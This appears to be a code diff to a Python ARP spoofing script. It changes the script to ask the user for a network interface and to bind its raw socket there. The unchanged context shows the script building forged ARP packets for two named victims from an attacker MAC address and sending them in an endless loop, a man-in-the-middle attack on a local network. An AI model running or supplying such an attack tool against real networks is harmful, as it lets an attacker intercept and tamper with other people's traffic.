@@ -12,8 +12,11 @@ import socket
 # The third parameter determines the protocol we want to use. 0x0800 is IP
 s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.htons(0x0800))
 
+# Get desired interface from the user
+intf = input("Enter the desired interface: ")
+
 # '' is set as the address to indicate we should listen to requests coming from anyone
-s.bind(('', socket.htons(0x0800)))
+s.bind((intf, socket.htons(0x0800)))
 
 # MAC addresses of involved machines
 # Formatting example: '\x00\x0c\x29\x4f\x8e\76'
@@ -53,6 +56,6 @@ victim2_ARP = ethernet2 + htype + prototype + hsize + psize + opcode + attackmac
 
 # Continuously send the forged ARP packets to the two targets
 while 1:
-    s.sendto(victim1_ARP, ('', socket.htons(0x0800)))
-    s.sendto(victim2_ARP, ('', socket.htons(0x0800)))
+    s.sendto(victim1_ARP, (intf, socket.htons(0x0800)))
+    s.sendto(victim2_ARP, (intf, socket.htons(0x0800)))
 
